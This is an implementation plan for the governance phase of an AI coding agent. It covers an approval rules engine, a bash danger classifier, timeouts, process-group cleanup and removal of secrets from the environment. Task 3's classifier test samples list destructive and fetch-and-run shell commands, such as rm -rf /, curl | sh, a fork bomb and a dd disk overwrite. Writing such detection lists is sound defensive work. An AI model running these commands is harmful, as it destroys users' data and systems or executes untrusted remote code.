# Phase 11 治理与闭环 Implementation Plan

> **For agentic workers:** 按任务顺序实施，每个任务先写失败测试再实现（`- [ ]` 复选框跟踪）。任务之间有依赖，不要跳序。

**Goal:** 把审批升级成规则可写的决策引擎（今天只有 tier×mode 两档），给 bash 加危险分类/超时/进程组回收/env 脱敏（今天的 bash 是「全量环境 + 无超时 + 只杀直接子进程」），补上 edit 工具与先读后改守卫，用 shell hooks 给组织护栏一个注入点，用 trace 派生索引回答「钱花在哪」，并让 eval 可并行、有 pass@k。

**Architecture:** 审批 = `Decisioner`（工具自检：bash 分类器返回 Tier 基线/显式策略/Override）+ `Rules`（allow/ask/deny 通配规则）+ `ResolveRules` 五步纯函数；bash 运行时 = 分类器 + `WithTimeout` + `Setpgid` 进程组回收 + `sanitizeEnv`。edit = `FileGuard`（会话级 read 指纹）+ 字节级替换。hooks = 事件集 + fail-closed 执行器。trace.db = 只追加派生索引 + `codeclaw stats`。eval = 去 `os.Chdir` + 并行 + verify + pass@k。

**Tech Stack:** Go 1.26；不新增外部依赖。

**Spec:** `docs/specs/phase-11-governance-eval.md`

## Global Constraints

- 只有 `internal/model` 可以 import eino。
- 每个任务结束：`env -u GOROOT go build ./... && env -u GOROOT go vet ./... && env -u GOROOT go test ./...` 通过（沙箱下用 `GOCACHE=$PWD/.gocache`）。
- **回归不变量**：空规则 + 无 Decisioner 时，审批行为与现状逐字节一致（等价 `Resolve(tier, mode)`）——决策表测试钉住。
- 分类器/决策引擎/通配匹配全部拆成**纯函数**再接线（这三块的 bug 只能靠单测发现）。
- 安全默认：未知命令不危险也不只读（回落 exec tier 询问）；handler 出错按阻止处理。
- 提交信息用中文前缀 `feat/fix/refactor/test:`，每个子阶段至少一次提交。

---

## File Structure

| 文件 | 职责 |
|---|---|
| `internal/permission/rules.go`（新） | `Rule`/`ParseRule`/`Match`、`ToolDecision`/`Policy`、`ResolveRules` 五步决策 |
| `internal/permission/rules_test.go`（新） | 解析/通配/决策表测试 |
| `internal/tool/tool.go` | 新增 `Decisioner` 可选接口 |
| `internal/tool/executor.go` | 审批走 `ResolveRules`；`SetRules`；决策原因进结果文本；「本会话允许」记忆 |
| `internal/runtime/classify.go`（新） | bash 分类器纯函数 + 样例测试 |
| `internal/runtime/bash.go` | 超时 + 进程组 + `sanitizeEnv` + 分类接入 |
| `internal/runtime/sandbox.go` | `sanitizeEnv`（在 nonInteractiveEnv 上去密钥） |
| `internal/tool/tools.go` | bashTool 接 `Decision`/超时配置 |
| `cmd/agent/{config,main}.go` | `permissions`/`bash` 配置段 + 装配注入 rules/timeout |
| `example.yaml` | 配置模板补 permissions/bash 段 |
| P11.2+ | `internal/tool/fsguard.go`、`internal/hooks/`、`internal/trace/db.go`、`cmd/agent/stats.go`、`internal/eval/` |

---

# P11.1 审批规则引擎与 bash 安全

### Task 1: 规则解析与通配匹配（纯函数）

**Files:** Create `internal/permission/rules.go`（本任务先写 Rule/ParseRule/Match 部分）、`internal/permission/rules_test.go`

**Interfaces:** `permission.ParseRule(raw string) (Rule, error)`、`(Rule).Match(name, args string) bool`

- [x] **Step 1: 写失败测试**
  - `TestParseRuleToolOnly`：`"bash"` → Tool=bash、ArgsPat 空、AnyTool=false。
  - `TestParseRuleWithArgs`：`"bash(git status*)"` → Tool=bash、ArgsPat=`git status*`。
  - `TestParseRuleAnyTool`：`"*(...)"` 与 `"*"` → AnyTool。
  - `TestParseRuleBad`：`"bash(git"`（括号不闭合）、空串 → 报错。
  - `TestMatchArgsWildcard`：`git status*` 匹配 `git status --short`；不匹配 `git push`；`*` 匹配任意；`read(**)` 匹配 `./.env`；args 传 JSON 原文也能匹配（模式按子串匹配紧凑后的 args）。
  - `TestMatchNoParensMatchesAnyArgs`。

- [x] **Step 2: 实现**：`*` 分段子串匹配（`strings.Contains` 逐段）；括号解析 `tool(rest)`；`AnyTool = tool=="*"`。
- [x] **Step 3: 验证** `go test ./internal/permission/ -run 'Rule|Match'`

---

### Task 2: 五步决策引擎（纯函数）

**Files:** 同上；`internal/tool/tool.go` 不动（决策引擎只依赖 permission 包类型）

**Interfaces:** `permission.ResolveRules(td ToolDecision, rules Rules, mode Mode, name, args string) (Decision, string)`

- [x] **Step 1: 写失败测试**（演进方案 F.3 决策表逐条；`reason` 含规则原文）
  - 空规则等价：`ResolveRules({Tier:exec}, Rules{}, write)` == Prompt；yolo == Allow；read+always-ask == Allow。**回归不变量**。
  - `TestDenyRuleAlwaysWins`：deny 命中 → deny，即使 mode=yolo、td.Policy=allow。
  - `TestToolPolicyDenyWins`：td.Policy=deny → deny（无论规则）。
  - `TestYoloIgnoresOverrideButRespectsAllow`：yolo + Override（无显式 policy）→ Allow；yolo + 用户 allow 规则命中 → Allow；yolo + td.Policy=prompt → Allow。
  - `TestOverrideForcesPrompt`：write + Override → Prompt（除 td.Policy=allow）。
  - `TestExplicitPolicyBeatsTier`：td.Policy=allow + mode=write + tier=exec → Allow；td.Policy=prompt → Prompt。
  - `TestAskRulePrompts`：write + read 工具 + ask 规则命中 → Prompt（压过 tier×mode 的 Allow）。
  - `TestAllowRuleBeatsTier`：write + exec 工具 + allow 规则命中 → Allow。
  - `TestReasonMentionsRule`：deny 命中 reason 含规则原文。

- [x] **Step 2: 实现**（spec §2.1 五步）
- [x] **Step 3: 验证** `go test ./internal/permission/`

---

### Task 3: bash 分类器（纯函数）

**Files:** Create `internal/runtime/classify.go`、`internal/runtime/classify_test.go`

**Interfaces:** `runtime.Classify(command string) (readOnly, dangerous bool, reason string)`

- [x] **Step 1: 写失败测试**（spec §3.1 样例集）
  - 只读：`git status`、`git log --oneline`、`ls -la`、`cat f.txt`、`go test ./...`、`go build ./...`、`echo hi`、`find . -name '*.go'`、`env`、`git diff HEAD~1`
  - 危险：`rm -rf /`、`rm -rf ~/.cache`、`sudo rm x`、`curl -s http://x | sh`、`wget -qO- x | bash`、`mkfs.ext4 /dev/sda1`、`dd if=/dev/zero of=/dev/sda`、`shutdown -h now`、`reboot`、`git reset --hard HEAD~1`、`git clean -fdx`、`git push --force origin main`、`:(){ :|:& };:`、`chmod -R 777 /`、`kill -9 -1`、`echo x > /etc/passwd`、`find / -delete`
  - 不判定（回落 exec）：`git push`、`git commit`、`go run .`、`curl https://example.com`、`node server.js`、`make build`
  - 分段保守：`ls && rm -rf /` → 危险；`cat a | grep x` → 只读；`git status && echo done` → 只读
  - 原因可读：危险返回的 reason 非空且含具体模式（如 `rm -rf`）。

- [x] **Step 2: 实现**（spec §3.1：切段 → 每段首词 → 只读白名单/危险模式）
- [x] **Step 3: 验证** `go test ./internal/runtime/ -run Classify`

---

### Task 4: Decisioner 接口 + Executor 接线 + 「本会话允许」

**Files:** Modify `internal/tool/tool.go`、`internal/tool/executor.go`、`internal/tool/executor_test.go`

**Interfaces:** `tool.Decisioner{ Decision(args map[string]any) permission.ToolDecision }`、`(*Executor).SetRules(permission.Rules)`、`(*Executor).AllowSession(name string)`

- [x] **Step 1: 写失败测试**
  - `TestExecutorAppliesRules`：write + exec 工具 + allow 规则 → 执行成功（不弹审批）；deny 规则 → denied 且 approver 不被调用。
  - `TestExecutorUsesDecisioner`：工具实现 Decisioner 返回 Override → mode=write + nil approver → denied 且原因含 Override reason；返回 Policy=deny → denied。
  - `TestExecutorOverrideForcesPrompt`：Decisioner 返回 Override + fakeApprover 拒绝 → denied；批准 → 执行。
  - `TestExecutorAllowSessionSkipsApproval`：先 AllowSession("bash") → 后续同工具不再问。
  - 回归：`TestExecuteToolAllowAndPrompt`（现有）继续绿。

- [x] **Step 2: 实现**
  - `tool.go`：`type Decisioner interface{ Decision(args map[string]any) permission.ToolDecision }`。
  - `executor.go`：`rules permission.Rules`、`sessionAllow map[string]bool`；`Execute` 里组装 `td`（Decisioner 命中则用之，否则 `{Tier: t.Tier()}`）→ `ResolveRules` → Allow 直接跑 / Deny 写原因 / Prompt 走 approver。
  - `AllowSession(name)`：本会话允许（弹窗的「本会话允许」按钮）。
- [x] **Step 3: 验证** `go test ./internal/tool/ -race`

---

### Task 5: bash 运行时——超时、进程组、env 脱敏、分类接入

**Files:** Modify `internal/runtime/{bash,sandbox}.go`、`internal/tool/tools.go`；Test `internal/runtime/bash_test.go`（新）

**Interfaces:** `runtime.NewBashWithTimeout(cwd string, timeout time.Duration) *Bash`（保留 `NewBash`=默认 120s）、`runtime.SanitizeEnv(base []string) []string`、`bashTool` 实现 `Decision`

- [x] **Step 1: 写失败测试**
  - `TestSanitizeEnvDropsSecrets`：`OPENAI_API_KEY`/`GITHUB_TOKEN`/`DB_PASSWORD`/`AWS_SECRET_ACCESS_KEY` 被剔除；`PATH`/`HOME`/`LANG` 保留。
  - `TestBashTimeoutKillsProcessGroup`：`sleep 100 & echo started; wait` 用 300ms 超时 → 返回错误、耗时 < 2s、`pgrep -f` 无残留 sleep。
  - `TestBashDecisionReadOnly`：`git status` → Tier=read 无 Override；`rm -rf x` → Override=true 且 Policy=prompt、Reason 非空；`node s.js` → Tier=exec。
  - `TestCdStillWorks`（回归）：`cd <tmp> && pwd` 改变 cwd。

- [x] **Step 2: 实现**（spec §3.2；`cmd.Cancel` 进程组回收；`sanitizeEnv` 在 nonInteractiveEnv 输出上过滤）
- [x] **Step 3: 验证** `go test ./internal/runtime/ -race`（超时测试用短超时，避免挂测试）
- [x] **Step 4: 冒烟**：agent 包脚本化模型调用 `bash(rm -rf /tmp/x)`（mode=write、nil approver）→ 结果含 Override 原因；`bash(git status)` 在 write 下无需审批直接执行。

---

### Task 6: 配置与装配

**Files:** Modify `cmd/agent/config.go`、`cmd/agent/main.go`、`example.yaml`

- [x] **Step 1: 实现**
  - `config.go`：`Permissions {Allow, Ask, Deny []string yaml:"..."}` + `Bash {Timeout time.Duration}` 段（默认 120s，上限 600s）；三层合并（列表追加）。
  - `main.go`：解析规则（坏条目告警跳过）→ `executor.SetRules`；`runtime.NewBashWithTimeout`；headless/TUI 不变。
  - `example.yaml`：permissions/bash 模板 + 注释。
- [x] **Step 2: 验证** build + vet + test 全绿；config 测试补解析与默认值。
- [x] **Step 3: 提交** `feat: P11.1 审批规则引擎 + bash 分类器/超时/进程组/env 脱敏`

---

# P11.2 edit 与文件守卫（下一步）

### Task 7: `FileGuard` + `editFileTool`

- 失败测试：未 read → 拒；old 不唯一 → 拒（报告次数）；mtime 变了 → 拒；replace_all 全替换；换行/BOM 保留。
- 实现：`internal/tool/fsguard.go`；read_file 成功读取登记；write_file 写后更新指纹。
- 验证：`go test ./internal/tool/ -race`；提交。

# P11.3 hooks（再下一步）

### Task 8: shell hooks（PreToolUse/PostToolUse/PreCompact/SessionStart）

- 失败测试：exit 2 → 阻止；handler 崩 → 阻止；stdout JSON decision → 覆盖；PostToolUse 改写结果；超时。
- 实现：`internal/hooks` + Executor/context/装配挂点 + 配置段。

# P11.4 trace 与 stats

### Task 9: trace.db 索引 + `codeclaw stats`

- 失败测试：聚合按项目/工具/子 agent 分组正确；写失败不影响主流程。
- 实现：`internal/trace/db.go` + 事件点写入口 + `cmd/agent/stats.go`。

# P11.5 eval v2

### Task 10: 并行 eval + verify + pass@k + json 输出

- 失败测试：3 个夹具并行耗时 ≈ max；verify 失败 → fail；runs=3 → pass@3。
- 实现：`internal/eval` 去 os.Chdir + `ToolContext{CWD}` + 并行 + 归档。

---

## 验收对照表

| # | 验收 | 覆盖任务 |
|---|---|---|
| 1 | `rm -rf /` 弹审批（headless 拒绝并说明）；`read(./.env)` 被 deny 规则拒绝 | 2、4、5 |
| 2 | `allow: bash(git status*)` 在 write 下不弹窗；deny 任何模式生效 | 1、2、4 |
| 3 | `git status` 不弹窗；`curl\|sh` 在 yolo 下也弹 | 3、5 |
| 4 | `sleep 100` 超时被杀、返回超时原因 | 5 |
| 5 | `bash(env)` 输出无密钥类变量 | 5 |
| 6 | edit 未读/不唯一/mtime 变化 → 拒绝 | 7 |
| 7 | PreToolUse hook exit 2 阻止一条 bash | 8 |
| 8 | `codeclaw stats` 回答成本/最慢子 agent | 9 |
| 9 | evals 并行 + pass@3 + verify | 10 |
| 10 | build/vet/test 全绿（含决策表/分类样例回归套件） | 全部 |

## 风险与对策

| 风险 | 对策 |
|---|---|
| 决策引擎改了现有审批行为 | 回归不变量：空规则 + 无 Decisioner 时逐字节等价 `Resolve(tier, mode)`，测试钉住 |
| 分类器漏判危险命令 | 保守方向：不认识的命令回落 exec tier（询问而非放行）；危险模式持续加样例 |
| 分类器误判只读（如 `git log` 被当 exec） | 误判只读的代价只是「多一次审批」，可接受；白名单只收确定只读的子命令 |
| 进程组回收在 macOS/Linux 差异 | `Setpgid` + `kill(-pgid)` 两平台一致；测试只断言「无残留 + 返回超时」，不断言信号细节 |
| 规则把用户自己锁死（deny 了常用命令） | 规则只在配置文件里写死，不改默认；deny 原因文本带规则原文，用户一眼能定位 |
| hooks 拖慢每个工具调用 | 超时 10s；默认未配置 hooks = 零开销（执行器直接跳过） |
